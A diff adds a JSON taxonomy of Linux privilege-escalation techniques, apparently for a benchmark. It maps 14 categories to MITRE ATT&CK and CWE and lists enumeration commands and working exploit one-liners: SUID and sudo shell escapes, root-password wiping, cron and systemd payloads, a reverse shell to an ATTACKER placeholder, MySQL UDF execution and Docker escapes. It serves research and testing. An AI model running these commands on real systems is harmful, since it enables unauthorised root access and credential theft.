@@ -1,0 +1,480 @@
+{
+  "_description": "PrivEscalate Taxonomy Knowledge Base - 14 sub-categories across 5 classes for Linux privilege escalation",
+  "_source": "MITRE ATT&CK (TA0004 seed with cross-tactic Linux mappings) + CWE + GTFOBins + Exploit-DB + PayloadsAllTheThings",
+  "_version": "1.0",
+  "_paper_ref": "3_Benchmark.tex Table 1 taxonomy",
+  "categories": {
+    "A1_suid_sgid": {
+      "name": "SUID/SGID abuse",
+      "class": "Misconfig.",
+      "attack_technique": "T1548.001",
+      "attack_technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+      "cwe": "CWE-250",
+      "cwe_name": "Execution with Unnecessary Privileges",
+      "description": "Exploiting Unix binaries that have the SUID or SGID bit set, allowing execution with the file owner's (typically root) privileges. The attacker finds a SUID binary that can be abused to spawn a shell, read/write arbitrary files, or execute arbitrary commands as root.",
+      "difficulty_range": ["easy", "medium"],
+      "interaction_mode": ["single_command", "interactive_escape"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["GTFOBins", "Exploit-DB"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "find / -perm -4000 -type f 2>/dev/null",
+        "find / -perm -2000 -type f 2>/dev/null",
+        "find / -perm -6000 -type f 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "Shell escape: binary -exec /bin/sh -p (find, nmap --interactive)",
+        "File read: binary reads /etc/shadow -> offline crack -> su root",
+        "File write: binary writes to /etc/passwd -> add root user",
+        "Custom binary with insecure system() call -> command injection",
+        "Shared object injection via SUID binary with writable RPATH"
+      ],
+      "keywords_in_exploitdb": ["suid", "setuid", "sgid", "setgid", "suid binary", "suid bit", "set-uid"],
+      "examples": [
+        {"binary": "find", "cmd": "find . -exec /bin/sh -p \\; -quit", "difficulty": "easy"},
+        {"binary": "vim", "cmd": "vim -c ':!/bin/sh -p'", "difficulty": "easy"},
+        {"binary": "python3", "cmd": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "difficulty": "easy"},
+        {"binary": "base64", "cmd": "base64 /etc/shadow | base64 -d", "difficulty": "medium", "note": "file-read, indirect privesc via password cracking"}
+      ]
+    },
+    "A2_sudo": {
+      "name": "Sudo misconfiguration",
+      "class": "Misconfig.",
+      "attack_technique": "T1548.003",
+      "attack_technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+      "cwe": "CWE-269",
+      "cwe_name": "Improper Privilege Management",
+      "description": "Exploiting misconfigured sudoers rules that allow a low-privileged user to run specific binaries as root without a password, or with overly permissive arguments. Includes sudo version-specific CVEs (e.g., CVE-2019-14287 uid=-1 bypass) and GTFOBins shell escapes via sudo-allowed editors/interpreters.",
+      "difficulty_range": ["easy", "medium"],
+      "interaction_mode": ["single_command", "interactive_escape"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["GTFOBins", "Exploit-DB", "PayloadsAllTheThings"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "sudo -l",
+        "cat /etc/sudoers 2>/dev/null",
+        "cat /etc/sudoers.d/* 2>/dev/null",
+        "sudo -V"
+      ],
+      "typical_exploit_patterns": [
+        "Shell escape: sudo binary -> interactive mode -> !/bin/sh (less, man, vi)",
+        "NOPASSWD on interpreters: sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
+        "env_keep+=LD_PRELOAD: compile malicious .so, sudo LD_PRELOAD=./evil.so binary",
+        "CVE-2019-14287: sudo -u#-1 /bin/bash (uid overflow to root)",
+        "CVE-2021-3156 (Baron Samedit): heap overflow in sudoedit"
+      ],
+      "keywords_in_exploitdb": ["sudo", "sudoers", "sudoedit", "sudo privilege", "sudo escalation", "sudo bypass", "baron samedit"],
+      "examples": [
+        {"binary": "less", "cmd": "sudo less /etc/hosts -> !/bin/sh", "difficulty": "easy"},
+        {"binary": "python3", "cmd": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", "difficulty": "easy"},
+        {"binary": "vi", "cmd": "sudo vi -> :!/bin/sh", "difficulty": "easy"},
+        {"binary": "env", "cmd": "sudo env /bin/sh", "difficulty": "easy"}
+      ]
+    },
+    "A3_capabilities": {
+      "name": "Capabilities abuse",
+      "class": "Misconfig.",
+      "attack_technique": "T1068",
+      "attack_technique_name": "Exploitation for Privilege Escalation",
+      "cwe": "CWE-266",
+      "cwe_name": "Incorrect Privilege Assignment",
+      "description": "Exploiting Linux capabilities assigned to binaries that grant partial root powers. Capabilities like CAP_SETUID allow a binary to change its UID to root, CAP_DAC_READ_SEARCH bypasses file read permissions, and CAP_NET_RAW enables raw socket operations. An overly granted capability on an interpreter or utility can be leveraged for full root escalation.",
+      "difficulty_range": ["medium"],
+      "interaction_mode": ["single_command", "multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "hard",
+      "data_sources": ["GTFOBins", "PayloadsAllTheThings"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "getcap -r / 2>/dev/null",
+        "cat /proc/self/status | grep Cap",
+        "capsh --decode=<hex>"
+      ],
+      "typical_exploit_patterns": [
+        "CAP_SETUID on interpreter: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+        "CAP_DAC_READ_SEARCH: binary reads /etc/shadow -> offline cracking",
+        "CAP_SETUID on compiled binary: craft binary to call setuid(0)+execve",
+        "CAP_SYS_PTRACE: attach to root process and inject shellcode"
+      ],
+      "keywords_in_exploitdb": ["capability", "capabilities", "cap_setuid", "cap_dac", "cap_sys", "linux capability", "getcap"],
+      "examples": [
+        {"binary": "python3", "cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "difficulty": "medium", "note": "requires cap_setuid+ep"},
+        {"binary": "perl", "cmd": "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'", "difficulty": "medium", "note": "requires cap_setuid+ep"},
+        {"binary": "tar", "cmd": "tar xf /etc/shadow -I '/bin/sh -c cat'", "difficulty": "medium", "note": "requires cap_dac_read_search+ep"}
+      ]
+    },
+    "A4_polkit": {
+      "name": "Polkit misconfiguration",
+      "class": "Misconfig.",
+      "attack_technique": "T1548",
+      "attack_technique_name": "Abuse Elevation Control Mechanism",
+      "cwe": "CWE-269",
+      "cwe_name": "Improper Privilege Management",
+      "description": "Exploiting PolicyKit (polkit) misconfigurations or vulnerabilities that allow unprivileged users to perform privileged D-Bus actions. Includes CVE-2021-4034 (PwnKit, pkexec memory corruption) and misconfigured polkit rules that grant broad administrative access without proper authentication checks.",
+      "difficulty_range": ["medium", "hard"],
+      "interaction_mode": ["single_command", "multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["Exploit-DB", "PayloadsAllTheThings"],
+      "docker_feasibility": "L1_or_L2",
+      "enumeration_commands": [
+        "pkexec --version",
+        "ls -la /usr/bin/pkexec",
+        "cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null",
+        "cat /usr/share/polkit-1/actions/*.policy 2>/dev/null",
+        "find / -name '*.policy' -path '*/polkit*' 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "CVE-2021-4034 (PwnKit): pkexec argv[0] manipulation -> arbitrary code as root",
+        "Misconfigured polkit rules: allow_any=yes on org.freedesktop.* actions",
+        "pkexec with vulnerable SUID: exploit pkexec binary directly",
+        "D-Bus activated polkit agents with weak authentication"
+      ],
+      "keywords_in_exploitdb": ["polkit", "pkexec", "policykit", "pwnkit", "CVE-2021-4034", "polkit privilege"],
+      "examples": [
+        {"binary": "pkexec", "cmd": "python3 CVE-2021-4034.py", "difficulty": "medium", "note": "PwnKit exploit, widely available PoC"},
+        {"binary": "pkexec", "cmd": "pkexec /bin/sh (with misconfigured allow_any=yes)", "difficulty": "hard", "note": "requires specific polkit rule misconfiguration"}
+      ]
+    },
+    "A5_dbus": {
+      "name": "D-Bus misconfiguration",
+      "class": "Misconfig.",
+      "attack_technique": "T1068",
+      "attack_technique_name": "Exploitation for Privilege Escalation",
+      "cwe": "CWE-269",
+      "cwe_name": "Improper Privilege Management",
+      "description": "Exploiting misconfigured D-Bus services that expose privileged operations to unprivileged users. D-Bus system services running as root may accept method calls without proper authentication or authorization checks, allowing an attacker to trigger privileged actions like package installation, service management, or arbitrary command execution.",
+      "difficulty_range": ["hard"],
+      "interaction_mode": ["multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "hard",
+      "data_sources": ["PayloadsAllTheThings"],
+      "docker_feasibility": "L2",
+      "enumeration_commands": [
+        "busctl list",
+        "busctl tree",
+        "dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames",
+        "gdbus introspect --system --dest=<service> --object-path=<path>",
+        "find / -name '*.conf' -path '*/dbus*' 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "Unauthenticated method calls: dbus-send to privileged service without auth checks",
+        "Exploiting exposed CreateUser/InstallPackage methods on system bus services",
+        "AccountsService CreateUser: dbus-send to create user with admin privileges",
+        "Service with shell execution via D-Bus properties or method arguments"
+      ],
+      "keywords_in_exploitdb": ["dbus", "d-bus", "dbus privilege", "dbus escalation", "system bus", "accountsservice"],
+      "examples": [
+        {"binary": "dbus-send", "cmd": "dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hacker string:'Hacker' int32:1", "difficulty": "hard", "note": "creates admin user via exposed D-Bus method"},
+        {"binary": "gdbus", "cmd": "gdbus call --system --dest=com.example.Vulnerable --object-path=/com/example/Vulnerable --method=com.example.Vulnerable.RunCommand 'id'", "difficulty": "hard", "note": "arbitrary command via misconfigured service"}
+      ]
+    },
+    "B1_ld_preload": {
+      "name": "LD_PRELOAD hijack",
+      "class": "Environ.",
+      "attack_technique": "T1574.006",
+      "attack_technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+      "cwe": "CWE-427",
+      "cwe_name": "Uncontrolled Search Path Element",
+      "description": "Exploiting the LD_PRELOAD environment variable or related dynamic linker mechanisms (ld.so.preload, LD_LIBRARY_PATH) to inject a malicious shared library into a privileged process. When sudo is configured with env_keep+=LD_PRELOAD, or a SUID binary loads libraries from a writable path, the attacker can execute arbitrary code with elevated privileges.",
+      "difficulty_range": ["medium", "hard"],
+      "interaction_mode": ["multi_step", "file_manipulation"],
+      "time_dependency": "none",
+      "detection_difficulty": "hard",
+      "data_sources": ["PayloadsAllTheThings", "Exploit-DB"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "sudo -l (look for env_keep+=LD_PRELOAD)",
+        "cat /etc/ld.so.preload 2>/dev/null",
+        "ldd <suid_binary>",
+        "readelf -d <binary> | grep NEEDED",
+        "strace <binary> 2>&1 | grep open.*\\.so"
+      ],
+      "typical_exploit_patterns": [
+        "sudo env_keep+=LD_PRELOAD: compile evil.so with __attribute__((constructor)), sudo LD_PRELOAD=./evil.so <allowed_binary>",
+        "Writable /etc/ld.so.preload: add path to malicious .so loaded by all SUID binaries",
+        "Missing shared library: SUID binary tries to load non-existent .so from writable dir",
+        "LD_LIBRARY_PATH with SUID: replace a dependency .so in a writable search path"
+      ],
+      "keywords_in_exploitdb": ["ld_preload", "preload", "ld.so", "shared library", "dynamic linker", "library injection", "ld_library_path"],
+      "examples": [
+        {"binary": "custom", "cmd": "gcc -shared -fPIC -o evil.so evil.c -nostartfiles && sudo LD_PRELOAD=./evil.so apache2", "difficulty": "medium", "note": "requires sudo env_keep+=LD_PRELOAD"},
+        {"binary": "custom", "cmd": "echo '/tmp/evil.so' >> /etc/ld.so.preload", "difficulty": "hard", "note": "requires write access to /etc/ld.so.preload"}
+      ]
+    },
+    "B2_path_hijack": {
+      "name": "PATH hijacking",
+      "class": "Environ.",
+      "attack_technique": "T1574.007",
+      "attack_technique_name": "Hijack Execution Flow: Path Interception by PATH Environment Variable",
+      "cwe": "CWE-426",
+      "cwe_name": "Untrusted Search Path",
+      "description": "Exploiting privileged scripts or binaries that invoke commands using relative paths instead of absolute paths. By placing a malicious binary earlier in the PATH or in a writable directory that precedes the legitimate binary, the attacker hijacks execution when the privileged process calls the unqualified command name.",
+      "difficulty_range": ["medium"],
+      "interaction_mode": ["multi_step", "file_manipulation"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["PayloadsAllTheThings", "Exploit-DB"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "echo $PATH",
+        "find / -perm -4000 -type f -exec strings {} \\; 2>/dev/null | grep -v '/'",
+        "cat /etc/crontab (look for scripts using relative commands)",
+        "ltrace <suid_binary> 2>&1 | grep system",
+        "strings <suid_binary> | grep -E '^[a-z]' (relative command names)"
+      ],
+      "typical_exploit_patterns": [
+        "SUID binary calls system('service restart'): create /tmp/service with /bin/bash payload, prepend /tmp to PATH",
+        "Cron script uses 'cp' without /bin/cp: place malicious 'cp' in writable PATH dir",
+        "Sudo script with relative imports: hijack command called within sudoed script",
+        "Custom SUID C binary with system() call using relative path"
+      ],
+      "keywords_in_exploitdb": ["path hijack", "path hijacking", "path injection", "relative path", "path variable", "command hijack"],
+      "examples": [
+        {"binary": "custom_suid", "cmd": "echo '/bin/bash -p' > /tmp/service && chmod +x /tmp/service && PATH=/tmp:$PATH ./vuln_suid", "difficulty": "medium"},
+        {"binary": "cron_script", "cmd": "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /home/user/tar && chmod +x /home/user/tar", "difficulty": "medium", "note": "cron script calls 'tar' with relative path"}
+      ]
+    },
+    "A6_weak_permissions": {
+      "name": "Weak file permissions",
+      "class": "Misconfig.",
+      "attack_technique": "T1222.002",
+      "attack_technique_name": "File and Directory Permissions Modification: Linux and Mac Permissions",
+      "cwe": "CWE-732",
+      "cwe_name": "Incorrect Permission Assignment for Critical Resource",
+      "description": "World-writable system password files allow a low-privilege user to alter root authentication data and obtain UID-0 access.",
+      "difficulty_range": ["medium"],
+      "interaction_mode": ["file_manipulation", "multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["expert-authored"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "ls -l /etc/passwd /etc/shadow",
+        "find /etc -maxdepth 1 -writable -type f 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "Append a UID-0 account to a world-writable /etc/passwd",
+        "Clear or replace the root password entry in a world-writable /etc/shadow"
+      ],
+      "keywords_in_exploitdb": ["world writable passwd", "writable shadow", "file permissions"],
+      "examples": [
+        {"binary": "sed", "cmd": "sed -i 's/^root:[^:]*:/root::/' /etc/passwd", "difficulty": "medium"}
+      ]
+    },
+    "C1_cron": {
+      "name": "Cron job exploitation",
+      "class": "Sched.",
+      "attack_technique": "T1053.003",
+      "attack_technique_name": "Scheduled Task/Job: Cron",
+      "cwe": "CWE-732",
+      "cwe_name": "Incorrect Permission Assignment for Critical Resource",
+      "description": "Exploiting cron jobs that run as root but reference world-writable scripts, directories with weak permissions, or scripts that can be modified by the attacker. The attacker modifies the cron-executed script to include a reverse shell or SUID copy of bash, then waits for the cron job to execute.",
+      "difficulty_range": ["easy", "medium"],
+      "interaction_mode": ["file_manipulation", "timing_dependent"],
+      "time_dependency": "cron_wait",
+      "detection_difficulty": "easy",
+      "data_sources": ["PayloadsAllTheThings", "Exploit-DB"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "cat /etc/crontab",
+        "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/",
+        "crontab -l",
+        "find / -writable -path '*/cron*' 2>/dev/null",
+        "ls -la /var/spool/cron/crontabs/ 2>/dev/null",
+        "systemctl list-timers --all 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "World-writable cron script: append reverse shell or SUID bash copy command",
+        "Cron script in writable directory: replace script entirely",
+        "Cron job PATH manipulation: cron uses custom PATH, place malicious binary first",
+        "Overwrite cron script dependency: if cron script sources another file",
+        "Writable cron.d directory: add new cron job file"
+      ],
+      "keywords_in_exploitdb": ["cron", "crontab", "cron job", "cronjob", "scheduled task", "cron privilege"],
+      "examples": [
+        {"binary": "bash", "cmd": "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh", "difficulty": "easy", "note": "world-writable cron script"},
+        {"binary": "bash", "cmd": "echo '* * * * * root /tmp/evil.sh' > /etc/cron.d/evil", "difficulty": "easy", "note": "writable cron.d directory"},
+        {"binary": "bash", "cmd": "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /opt/scripts/cleanup.sh", "difficulty": "medium", "note": "replace cron script with reverse shell"}
+      ]
+    },
+    "C2_systemd": {
+      "name": "Systemd service",
+      "class": "Sched.",
+      "attack_technique": "T1543.002",
+      "attack_technique_name": "Create or Modify System Process: Systemd Service",
+      "cwe": "CWE-732",
+      "cwe_name": "Incorrect Permission Assignment for Critical Resource",
+      "description": "Exploiting a systemd service unit with weak file permissions or a misconfigured ExecStart directive. If the unit file or the script it references is writable by a low-privileged user, they can modify it to execute arbitrary commands as root when the service loads.",
+      "difficulty_range": ["medium", "hard"],
+      "interaction_mode": ["file_manipulation", "multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["PayloadsAllTheThings"],
+      "docker_feasibility": "L2",
+      "enumeration_commands": [
+        "systemctl list-unit-files --type=service",
+        "find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null",
+        "find / -name '*.service' -writable 2>/dev/null",
+        "ls -la /etc/systemd/system/"
+      ],
+      "typical_exploit_patterns": [
+        "Writable service unit: modify ExecStart to run malicious command",
+        "Writable ExecStart script: replace referenced script with payload",
+        "Service with writable environment file: inject malicious env variables"
+      ],
+      "keywords_in_exploitdb": ["systemd", "systemd service", "systemctl", "unit file", "service file"],
+      "examples": [
+        {"binary": "systemctl", "cmd": "echo -e '[Service]\\nType=oneshot\\nExecStart=/bin/bash -c \"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\"' > /etc/systemd/system/evil.service && systemctl daemon-reload && systemctl start evil", "difficulty": "medium", "note": "writable /etc/systemd/system/"},
+        {"binary": "bash", "cmd": "echo '#!/bin/bash\\nchmod +s /bin/bash' > /opt/scripts/service-script.sh", "difficulty": "medium", "note": "writable ExecStart target script"}
+      ]
+    },
+    "D1_credential": {
+      "name": "Password disclosure",
+      "class": "Cred.",
+      "attack_technique": "T1552.001/.003",
+      "attack_technique_name": "Unsecured Credentials: Credentials In Files / Shell History",
+      "cwe": "CWE-256",
+      "cwe_name": "Plaintext Storage of a Password",
+      "description": "Discovering plaintext or weakly protected credentials stored in files, environment variables, command history, configuration files, or process memory. The attacker finds root or privileged user passwords/tokens and uses them to escalate via su, sudo, or service authentication.",
+      "difficulty_range": ["easy"],
+      "interaction_mode": ["single_command", "multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "easy",
+      "data_sources": ["PayloadsAllTheThings", "Exploit-DB"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null",
+        "find / -name '*.cfg' -exec grep -l 'pass' {} \\; 2>/dev/null",
+        "cat ~/.bash_history | grep -i 'pass\\|secret\\|key'",
+        "env | grep -i 'pass\\|secret\\|key\\|token'",
+        "find / -name '.env' 2>/dev/null",
+        "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i pass",
+        "find / -name 'wp-config.php' -o -name 'config.php' 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "Plaintext passwords in config files: /etc/*, /opt/*/config*, .env files",
+        "Command history: bash_history contains 'mysql -p<password>' or 'su <password>'",
+        "Backup files: .bak, .old, .swp files containing credentials",
+        "Environment variables: process environ leaking DB/API passwords",
+        "Readable /etc/shadow: direct access to password hashes -> offline cracking"
+      ],
+      "keywords_in_exploitdb": ["password", "credential", "credentials", "plaintext password", "password disclosure", "password leak", "hardcoded password", "information disclosure"],
+      "examples": [
+        {"binary": "cat", "cmd": "cat /var/www/html/wp-config.php | grep DB_PASSWORD", "difficulty": "easy"},
+        {"binary": "cat", "cmd": "cat /home/*/.bash_history | grep -i password", "difficulty": "easy"},
+        {"binary": "su", "cmd": "su root (with discovered password from config file)", "difficulty": "easy"},
+        {"binary": "cat", "cmd": "cat /etc/shadow (world-readable -> john --wordlist)", "difficulty": "easy"}
+      ]
+    },
+    "D2_ssh_key": {
+      "name": "SSH key injection",
+      "class": "Cred.",
+      "attack_technique": "T1098.004",
+      "attack_technique_name": "Account Manipulation: SSH Authorized Keys",
+      "cwe": "CWE-522",
+      "cwe_name": "Insufficiently Protected Credentials",
+      "description": "Exploiting a writable authorized_keys file attached to a privileged account to inject the attacker's public key. The attacker then uses the matching private key to SSH as the privileged user.",
+      "difficulty_range": ["easy", "medium"],
+      "interaction_mode": ["single_command", "file_manipulation"],
+      "time_dependency": "none",
+      "detection_difficulty": "easy",
+      "data_sources": ["PayloadsAllTheThings", "Exploit-DB"],
+      "docker_feasibility": "L1",
+      "enumeration_commands": [
+        "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null",
+        "find / -name 'authorized_keys' -writable 2>/dev/null",
+        "ls -la /root/.ssh/ 2>/dev/null",
+        "cat /home/*/.ssh/id_rsa 2>/dev/null",
+        "find / -name '*.pem' -o -name '*.key' 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "Readable root SSH key: cat /root/.ssh/id_rsa -> ssh -i root@localhost",
+        "Writable authorized_keys: echo attacker_pubkey >> /root/.ssh/authorized_keys",
+        "SSH key in backup/web directory: found in /var/backups/, /var/www/, /tmp/",
+        "SSH key with weak passphrase: ssh2john + hashcat/john for cracking"
+      ],
+      "keywords_in_exploitdb": ["ssh key", "ssh_key", "ssh private key", "authorized_keys", "id_rsa", "ssh privilege", "ssh authentication"],
+      "examples": [
+        {"binary": "ssh", "cmd": "cp /root/.ssh/id_rsa /tmp/ && chmod 600 /tmp/id_rsa && ssh -i /tmp/id_rsa root@localhost", "difficulty": "easy"},
+        {"binary": "bash", "cmd": "echo 'ssh-rsa AAAA...attacker_key...' >> /root/.ssh/authorized_keys", "difficulty": "easy", "note": "requires writable authorized_keys"},
+        {"binary": "ssh", "cmd": "ssh -i /var/backups/root_key root@localhost", "difficulty": "medium", "note": "key found in non-standard location"}
+      ]
+    },
+    "D3_database": {
+      "name": "DB credential privesc",
+      "class": "Cred.",
+      "attack_technique": "T1078.003",
+      "attack_technique_name": "Valid Accounts: Local Accounts",
+      "cwe": "CWE-269",
+      "cwe_name": "Improper Privilege Management",
+      "description": "Exploiting database services (MySQL, PostgreSQL) running as root or with elevated privileges where the attacker discovers database credentials and leverages database-specific features for privilege escalation. Includes MySQL UDF (User-Defined Function) loading to execute OS commands, PostgreSQL COPY program execution, or using discovered DB credentials that match system user passwords.",
+      "difficulty_range": ["medium", "hard"],
+      "interaction_mode": ["multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["Exploit-DB", "PayloadsAllTheThings"],
+      "docker_feasibility": "L1_or_L2",
+      "enumeration_commands": [
+        "mysql -u root -p (try common/discovered passwords)",
+        "find / -name 'my.cnf' -o -name '.my.cnf' 2>/dev/null",
+        "find / -name 'pg_hba.conf' 2>/dev/null",
+        "ps aux | grep -E 'mysql|postgres'",
+        "cat /etc/mysql/debian.cnf 2>/dev/null",
+        "find / -name 'wp-config.php' -exec grep DB_ {} \\; 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "MySQL UDF: load raptor_udf2.so -> CREATE FUNCTION sys_exec -> SELECT sys_exec('chmod +s /bin/bash')",
+        "PostgreSQL COPY PROGRAM: COPY (SELECT '') TO PROGRAM 'id' (requires superuser)",
+        "MySQL FILE privilege: SELECT LOAD_FILE('/etc/shadow'); or INTO OUTFILE to write webshell",
+        "Credential reuse: DB root password matches system root password -> su root"
+      ],
+      "keywords_in_exploitdb": ["mysql", "udf", "mysql privilege", "postgresql", "postgres", "database privilege", "mysql root", "db credential", "raptor"],
+      "examples": [
+        {"binary": "mysql", "cmd": "mysql -u root -p<found_pass> -e \"CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so'; SELECT sys_exec('chmod +s /bin/bash');\"", "difficulty": "hard"},
+        {"binary": "psql", "cmd": "psql -U postgres -c \"COPY (SELECT '') TO PROGRAM 'chmod +s /bin/bash'\"", "difficulty": "medium", "note": "requires PostgreSQL superuser"},
+        {"binary": "su", "cmd": "su root (using password found in /var/www/html/config.php DB_PASSWORD)", "difficulty": "medium", "note": "credential reuse from database config"}
+      ]
+    },
+    "E1_docker_escape": {
+      "name": "Docker/container escape",
+      "class": "Cont.",
+      "attack_technique": "T1611",
+      "attack_technique_name": "Escape to Host",
+      "cwe": "CWE-268",
+      "cwe_name": "Privilege Chaining",
+      "description": "Escaping from a Docker container to the host system or escalating privileges within a container by exploiting misconfigured Docker settings. Includes abusing mounted Docker socket, privileged containers, excessive capabilities, sensitive host mounts, or Docker group membership to gain root access on the host.",
+      "difficulty_range": ["medium", "hard"],
+      "interaction_mode": ["multi_step"],
+      "time_dependency": "none",
+      "detection_difficulty": "medium",
+      "data_sources": ["PayloadsAllTheThings", "Exploit-DB"],
+      "docker_feasibility": "L2",
+      "enumeration_commands": [
+        "ls -la /var/run/docker.sock 2>/dev/null",
+        "cat /proc/1/cgroup | grep docker",
+        "cat /.dockerenv 2>/dev/null",
+        "capsh --print",
+        "fdisk -l 2>/dev/null",
+        "mount | grep -E 'docker|overlay'",
+        "id (check docker group membership)",
+        "docker images 2>/dev/null"
+      ],
+      "typical_exploit_patterns": [
+        "Docker socket mount: docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+        "Privileged container: mount host disk, chroot to host filesystem",
+        "Docker group: user in docker group can mount host filesystem via docker run",
+        "CAP_SYS_ADMIN in container: mount host cgroup, write release_agent for escape",
+        "Exposed Docker API: curl http://localhost:2375/containers/json -> create privileged container"
+      ],
+      "keywords_in_exploitdb": ["docker", "container escape", "container breakout", "docker escape", "docker privilege", "docker group", "docker.sock", "container privilege"],
+      "examples": [
+        {"binary": "docker", "cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "difficulty": "medium", "note": "user in docker group"},
+        {"binary": "bash", "cmd": "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release && echo '#!/bin/sh\\nps aux > /output' > /cmd && echo '/cmd' > /tmp/cgrp/release_agent", "difficulty": "hard", "note": "privileged container cgroup escape"},
+        {"binary": "docker", "cmd": "curl -s --unix-socket /var/run/docker.sock http://localhost/images/json", "difficulty": "medium", "note": "mounted Docker socket"}
+      ]
+    }
+  }
+}
